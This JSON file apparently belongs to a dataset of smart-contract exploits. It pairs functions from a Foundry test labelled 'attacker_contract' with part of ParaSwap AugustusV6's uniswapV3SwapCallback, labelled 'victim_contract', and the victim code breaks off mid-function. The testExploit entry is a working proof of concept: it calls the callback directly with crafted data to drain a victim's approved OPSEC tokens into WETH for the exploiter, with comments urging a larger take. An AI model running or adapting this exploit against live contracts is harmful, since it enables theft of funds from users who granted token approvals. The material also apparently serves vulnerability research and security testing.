[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 19_470_560);\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(OPSEC), \"OPSEC\");\n        vm.label(address(wTAO), \"wTAO\");\n        vm.label(address(AugustusV6), \"AugustusV6\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\n            \"Exploiter WETH balance before attack\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n\n        emit log_named_decimal_uint(\"Victim OPSEC balance before attack\", OPSEC.balanceOf(from), OPSEC.decimals());\n\n        emit log_named_decimal_uint(\n            \"Victim approved OPSEC amount before attack\", OPSEC.allowance(from, address(AugustusV6)), OPSEC.decimals()\n        );\n\n        // Amount0Delta negative value can be arbitrary up to 0\n        int256 amount0Delta = 0;\n        // In the attack tx 6_463_332_789_527_457_985 amount of WETH was transferred to the exploiter (frontran by whitehat)\n        // Let's try more -> 10 WETH\n        int256 amount1Delta = 10e18;\n        address to = address(this);\n        uint256 fee1 = 3000;\n        uint256 fee2 = 10_000;\n        bytes32 encodedOPSECAddr = 0x8000000000000000000000006a7eff1e2c355ad6eb91bebb5ded49257f3fed98;\n        bytes memory data =\n            abi.encode(to, from, address(wTAO), address(WETH), fee1, encodedOPSECAddr, address(WETH), fee2);\n\n        AugustusV6.uniswapV3SwapCallback(amount0Delta, amount1Delta, data);\n\n        emit log_named_decimal_uint(\n            \"Victim OPSEC balance after attack\", OPSEC.balanceOf(address(from)), OPSEC.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Victim approved OPSEC amount after attack\", OPSEC.allowance(from, address(AugustusV6)), OPSEC.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter WETH balance after attack\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IParaSwapAugustusV6",
    "source_type": "victim_contract",
    "function_name": "uniswapV3SwapCallback",
    "original_code": "    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {\n        uint256 uniswapV3FactoryAndFF = UNISWAP_V3_FACTORY_AND_FF;\n        uint256 uniswapV3PoolInitCodeHash = UNISWAP_V3_POOL_INIT_CODE_HASH;\n        address permit2Address = PERMIT_2;\n        bool isPermit2 = data.length == 512;\n        // Check if data length is greater than 160 bytes (1 pool)\n        // We pass multiple pools in data when executing a multi-hop swapExactAmountOut\n        if (data.length > 160 && !isPermit2) {\n            // Initialize recursive variables\n            address payer;\n            // solhint-disable-next-line no-inline-assembly\n            assembly {\n                // Copy payer address from calldata\n                payer := calldataload(164)\n            }\n\n            // Recursive call swapExactAmountOut\n            _callUniswapV3PoolsSwapExactAmountOut(amount0Delta > 0 ? -amount0Delta : -amount1Delta, data, payer);\n        } else {\n            // solhint-disable-next-line no-inline-assembly\n            assembly {\n                // Token to send to the pool\n                let token\n                // Amount to send to the pool\n                let amount\n                // Pool address\n                let poolAddress := caller()\n\n                // Get free memory pointer\n                let ptr := mload(64)\n\n                // We need make sure the caller is a UniswapV3Pool deployed by the canonical UniswapV3Factory\n                // 1. Prepare data for calculating the pool address\n                // Store ff+factory address, Load token0, token1, fee from bytes calldata and store pool init code hash\n\n                // Store 0xff + factory address (right padded)\n                mstore(ptr, uniswapV3FactoryAndFF)\n\n                // Store data offset + 21 bytes (UNISWAP_V3_FACTORY_AND_FF SIZE)\n                let token0Offset := add(ptr, 21)\n\n                // Copy token0, token1, fee to free memory pointer + 21 bytes (UNISWAP_V3_FACTORY_AND_FF SIZE) + 1 byte\n                // (direction)\n                calldatacopy(add(token0Offset, 1), add(data.offset, 65), 95)\n\n                // 2. Calculate the pool address\n",
    "description": ""
  }
]